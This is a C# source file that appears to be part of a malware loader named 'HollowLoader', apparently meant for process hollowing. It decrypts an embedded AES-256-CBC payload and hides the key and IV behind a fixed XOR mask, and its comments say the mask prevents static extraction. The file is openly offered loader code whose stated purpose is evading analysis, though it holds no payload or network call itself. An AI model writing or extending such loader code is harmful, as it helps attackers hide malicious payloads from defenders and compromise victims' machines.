using System;
using System.Security.Cryptography;

namespace HollowLoader
{
    /// <summary>
    /// AES-256-CBC decryption of the embedded payload plus the XOR mask used to
    /// store the key/IV in the binary (prevents trivial static extraction).
    /// </summary>
    internal static class Crypto
    {
        /// <summary>Mask applied to the stored key/IV. Must match PayloadEncryptor --mask.</summary>
        internal const byte KeyMask = 0xAA;

        internal static byte[] Unmask(byte[] masked)
        {
            byte[] plain = new byte[masked.Length];
            for (int i = 0; i < masked.Length; i++)
                plain[i] = (byte)(masked[i] ^ KeyMask);
            return plain;
        }

        internal static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform dec = aes.CreateDecryptor())
                {
                    return dec.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                }
            }
        }
    }
}
